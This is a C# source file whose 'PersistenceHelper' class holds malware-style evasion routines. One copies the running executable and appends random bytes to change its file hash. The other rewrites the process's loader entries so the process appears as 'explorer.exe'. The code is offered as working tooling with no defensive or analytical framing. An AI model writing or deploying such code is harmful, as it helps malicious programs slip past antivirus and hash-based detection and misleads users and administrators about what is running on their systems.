using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace zort
{
    public static class PersistenceHelper
    {
        public static byte[] CreateClone()
        {
            // Create a clone of the application with added arbitrary data to change the hash
            byte[] selfBytes = System.IO.File.ReadAllBytes(System.Reflection.Assembly.GetExecutingAssembly().Location);
            byte[] arbitraryData = new byte[32];
            Random random = new Random();
            random.NextBytes(arbitraryData);
            byte[] cloneBytes = new byte[selfBytes.Length + arbitraryData.Length];
            Buffer.BlockCopy(selfBytes, 0, cloneBytes, 0, selfBytes.Length);
            Buffer.BlockCopy(arbitraryData, 0, cloneBytes, selfBytes.Length, arbitraryData.Length);
            return cloneBytes;
        }

        public static unsafe void MasqueradeAsExplorer()
        {
            NativeMethods.CoInitializeEx(IntPtr.Zero, NativeMethods.COINIT_APARTMENTTHREADED | NativeMethods.COINIT_DISABLE_OLE1DDE);
            NativeMethods.LdrEnumerateLoadedModules(0, (IntPtr entryPtr, IntPtr context, ref bool stop) =>
            {
                var entry = (LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(entryPtr, typeof(LDR_DATA_TABLE_ENTRY));
                if (entry.DllBase == NativeMethods.GetImageBase())
                {
                    string fakeName = "explorer.exe";
                    var fakeNameBuffer = Marshal.StringToHGlobalUni(fakeName);
                    entry.BaseDllName.Buffer = fakeNameBuffer;
                    entry.BaseDllName.Length = (ushort)(fakeName.Length * 2);
                    entry.BaseDllName.MaximumLength = (ushort)((fakeName.Length + 1) * 2);

                    string fakePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), fakeName);
                    var fakePathBuffer = Marshal.StringToHGlobalUni(fakePath);
                    entry.FullDllName.Buffer = fakePathBuffer;
                    entry.FullDllName.Length = (ushort)(fakePath.Length * 2);
                    entry.FullDllName.MaximumLength = (ushort)((fakePath.Length + 1) * 2);

                    Marshal.StructureToPtr(entry, entryPtr, true);
                    stop = true;
                    return true;
                }
                return false;
            }, IntPtr.Zero);
            NativeMethods.CoUninitialize();
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct LDR_DATA_TABLE_ENTRY
        {
            public IntPtr Reserved1;
            public IntPtr Reserved2;
            public IntPtr DllBase;
            public UNICODE_STRING FullDllName;
            public UNICODE_STRING BaseDllName;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }
    }
}
